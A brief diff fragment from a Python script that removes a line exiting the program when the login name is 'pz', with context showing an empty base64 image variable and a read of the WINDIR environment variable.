@@ -4,7 +4,6 @@ from threading import Thread
 
 image = '' #base64 image
 
-if os.getlogin() == 'pz': sys.exit()
 if __name__ == '__main__':
     try:
         windows_folder = os.environ['WINDIR']
